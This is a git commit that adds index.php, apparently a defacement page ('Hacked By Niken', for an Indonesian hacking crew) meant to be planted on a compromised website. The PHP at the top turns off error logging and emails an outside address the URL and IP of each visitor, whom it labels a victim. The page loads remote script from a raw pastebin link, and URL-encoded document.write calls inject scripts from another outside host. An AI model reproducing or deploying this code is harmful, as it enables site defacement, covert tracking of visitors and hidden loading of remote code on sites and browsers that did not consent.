fd6d251fb92a5415139eda14e0d39ecd205eb5c5
niken404 <68155118+niken404@users.noreply.github.com>
2020-07-17 01:48:28 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,124 @@
+<?php
+
+error_reporting(0);
+set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
+
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'abitfajar45@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "Korban Telah Membuka $x_path :p <br> IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, 'Masuk Laporan Bos :v' , $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+
+echo '<center><font color="cyan">Server Detail Info:<br></center>';
+$indicesServer = array(
+'PHP_SELF',
+'GATEWAY_INTERFACE',
+'SERVER_ADDR',
+'SERVER_NAME',
+'SERVER_SOFTWARE',
+'SERVER_PROTOCOL',
+'REQUEST_METHOD',
+'REQUEST_TIME',
+'REQUEST_TIME_FLOAT',
+'DOCUMENT_ROOT',
+'HTTP_ACCEPT_LANGUAGE',
+'HTTP_HOST',
+'HTTP_USER_AGENT') ;
+
+
+echo '<table cellpadding="1">' ;
+foreach ($indicesServer as $arg) {
+    if (isset($_SERVER[$arg])) {
+        echo '<tr><td><font color="green">'.$arg.'</td><td>' . $_SERVER[$arg] . '</td></tr>' ;
+    }
+    else {
+        echo '<tr><td>'.$arg.'</td><td>-</td></tr>' ;
+    }
+}
+echo '</table>' ;
+
+if(get_magic_quotes_gpc()){
+foreach($_POST as $key=>$value){
+$_POST[$key] = stripslashes($value);
+}
+}
+
+?>
+<html>
+<head>
+</script>
+<meta charset='utf-8'/>
+<meta name='description' content=' .:[JTCT{OFC}]:. ' />
+<meta name='keywords' content='JAWA TIMUR CYBER TEAM' />
+<meta name='author' content='NIKEN' />
+<link rel="icon" type="image/gif" href="https://l.top4top.io/p_1642ug2bp0.jpg">
+<link href="https://fonts.googleapis.com/css2?family=Courier+Prime&display=swap" rel="stylesheet">
+<style>
+body{ 
+background-image: url('https://l.top4top.io/p_1642ug2bp0.jpg'); 
+background-color: Black; 
+background-repeat: no-repeat; 
+background-attachment: fixed; 
+background-size: 100% 100%; } 
+</style>
+<style>
+.nice {
+    font-family:'Courier Prime';
+    text-align:center;
+}
+a 
+{
+    color:black;
+}
+.btn {
+border:1px solid red;
+    width:35%;
+    height:5%;
+    font-family:'Courier Prime';
+    text-align:center;
+    background-color:blue;
+}
+.h2 {
+font-family:Comic Sans MS;
+color:white; 
+solid:yellow;
+text-align:center;
+} 
+
+</style>
+<body>
+<body bgcolor="pink"><center><table width='100%' height='100%'><td align='center'>	<style type="text/css">/* latin */ @font-face { font-family: 'nosifer'; font-style: normal; font-weight: 400; src: local('Iceland'), local('Iceland-Regular'), url('https://fonts.gstatic.com/s/iceland/v8/rax9HiuFsdMNOnWPaKtMARJYk0o.woff2) format('woff2'); unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; '}	</style>
+<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
+<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju-2.js" type="text/javascript"></script>
+<script src="https://pastebin.com/raw/8v6kQfn5" type="text/javascript"></script>
+<title>Hacked By Niken</title>
+<link REL="SHORTCUT ICON" HREF="https://l.top4top.io/p_1642ug2bp0.jpg">
+<link href="http://fonts.googleapis.com/css?family=Indie+Flower" rel="stylesheet"> 
+<link href="http://fonts.googleapis.com/css?family=Indie+Flower" rel="stylesheet">
+<center><img size="1" src="https://gifimage.net/wp-content/uploads/2018/04/kumpulan-gambar-gif-7.gif"></center>
+<font face='nosifer' color='blue' font size="35"><i>Hacked By <br><font color="red" face="nice">Niken <font color="blue" face="nice">Feat</font> <font color="red">Niken</i></font><br> <br>
+
+<iframe scrolling="no" frameborder="no" clocktype="html5" style="overflow:hidden;border:0;margin:0;padding:0;width:300px;height:75px;"src="https://www.clocklink.com/html5embed.php?clock=038&timezone=Indonesia_Jakarta&color=black&size=300&Title=&Message=&Target=&From=2019,1,1,0,0,0&Color=black" align="top" ></iframe><br><br>
+
+<font face='nosifer' color='red' font size="6">Masih Ngarepin Seseorang? Jangan Lama-Lama Yha<br> .Apa Lagi Dia Tidak Meresponmu, Jangan Buang Waktu Dan Tenagamu<br> Untuk Orang Yang Tidak Benar Benar Mencintaimu<br> .:[Anjay Bucin]:.<br> <br> <br>
+<button class="btn"><h2>62895366841416<a href="https://wa.me/62895366841416?text=Anjink Web Gua Di HEK Bgsd"></a></button><h2><br>
+<font face='nosifer' color='red' font size="7">Thnks To </font><br>
+<marquee behavior="alternate" scrollamount="6" width="20%"><font face='nosifer' color='red' font size="5">JTCT</font></marquee><br>
+<font face='nosifer' color='red' font size="7">Greetz To </font><br>
+<marquee behavior="alternate" scrollamount="6" width="20%"><font face='nosifer' color='red' font size="5">JAWA TIMUR CYBER TEAM</font></marquee><br>
+<iframe width="0" height="0" src="https://a.top4top.io/m_16425ne971.mp3" frameborder="0" allowfullscreen=""></iframe>
+
+		
+		</span>
+<script Language='Javascript'>
+<!--
+document.write(unescape('%3C%73%74%79%6C%65%20%74%79%70%65%3D%22%74%65%78%74%2F%63%73%73%22%3E%68%74%6D%6C%2C%62%6F%64%79%7B%68%65%69%67%68%74%3A%31%30%30%25%3B%6D%61%72%67%69%6E%3A%30%3B%70%61%64%64%69%6E%67%3A%30%7D%75%6C%2C%6C%69%7B%74%65%78%74%2D%69%6E%64%65%6E%74%3A%30%3B%74%65%78%74%2D%64%65%63%6F%72%61%74%69%6F%6E%3A%6E%6F%6E%65%3B%6D%61%72%67%69%6E%3A%30%3B%70%61%64%64%69%6E%67%3A%30%7D%69%6D%67%7B%62%6F%72%64%65%72%3A%30%7D%62%6F%64%79%7B%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%23%30%30%30%3B%63%6F%6C%6F%72%3A%23%39%39%39%3B%66%6F%6E%74%3A%31%30%30%25%2F%31%38%70%78%20%68%65%6C%76%65%74%69%63%61%2C%61%72%69%61%6C%2C%73%61%6E%73%2D%73%65%72%69%66%7D%63%61%6E%76%61%73%7B%63%75%72%73%6F%72%3A%63%72%6F%73%73%68%61%69%72%3B%64%69%73%70%6C%61%79%3A%62%6C%6F%63%6B%3B%6C%65%66%74%3A%30%3B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%30%3B%7A%2D%69%6E%64%65%78%3A%32%30%7D%23%68%65%61%64%65%72%20%69%6D%67%7B%77%69%64%74%68%3A%31%30%30%25%3B%68%65%69%67%68%74%3A%32%30%25%7D%23%62%67%20%69%6D%67%7B%77%69%64%74%68%3A%31%30%30%25%3B%68%65%69%67%68%74%3A%38%30%25%7D%23%68%65%61%64%65%72%2C%23%62%67%7B%70%6F%73%69%74%69%6F%6E%3A%66%69%78%65%64%3B%6C%65%66%74%3A%30%3B%72%69%67%68%74%3A%30%3B%7A%2D%69%6E%64%65%78%3A%31%30%7D%23%68%65%61%64%65%72%7B%74%6F%70%3A%30%7D%23%62%67%7B%70%6F%73%69%74%69%6F%6E%3A%66%69%78%65%64%3B%7A%2D%69%6E%64%65%78%3A%31%3B%62%6F%74%74%6F%6D%3A%30%7D%61%75%64%69%6F%7B%70%6F%73%69%74%69%6F%6E%3A%66%69%78%65%64%3B%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%3B%62%6F%74%74%6F%6D%3A%30%3B%6C%65%66%74%3A%30%3B%72%69%67%68%74%3A%30%3B%77%69%64%74%68%3A%31%30%30%25%3B%7A%2D%69%6E%64%65%78%3A%35%7D%2E%77%65%62%64%65%73%69%67%6E%7B%77%69%64%74%68%3A%33%30%25%3B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%30%3B%6C%65%66%74%3A%30%3B%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%74%61%68%6F%6D%61%3B%74%65%78%74%2D%64%65%63%6F%72%61%74%69%6F%6E%3A%6E%6F%6E%65%3B%63%6F%6C%6F%72%3A%23%32%33%32%33%32%33%3B%66%6F%6E%74%2D%73%69%7A%65%3A%31%31%70%78%7D%2E%77%65%62%64%65%73%69%67%6E%32%7B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%30%3B%72%69%67%68%74%3A%30%3B%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%74%61%68%6F%6D%61%3B%74%65%78%74%2D%64%65%63%6F%72%61%74%69%6F%6E%3A%6E%6F%6E%65%3B%63%6F%6C%6F%72%3A%23%32%33%32%33%32%33%3B%66%6F%6E%74%2D%73%69%7A%65%3A%31%31%70%78%7D%23%62%67%69%6D%67%7B%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%7D%23%62%67%69%6D%67%31%7B%64%69%73%70%6C%61%79%3A%62%6C%6F%63%6B%7D%40%6D%65%64%69%61%20%73%63%72%65%65%6E%20%61%6E%64%20%28%6D%61%78%2D%77%69%64%74%68%3A%35%30%30%70%78%29%7B%23%62%67%69%6D%67%31%7B%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%7D%23%62%67%69%6D%67%7B%64%69%73%70%6C%61%79%3A%62%6C%6F%63%6B%7D%7D%3C%2F%73%74%79%6C%65%3E%0A'));
+document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%70%61%72%73%69%63%6F%2E%6E%65%74%2F%70%61%67%65%73%2F%66%77%2F%73%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E%0A%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%70%61%72%73%69%63%6F%2E%6E%65%74%2F%70%61%67%65%73%2F%66%77%2F%66%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E'));
+//-->
+</Script>
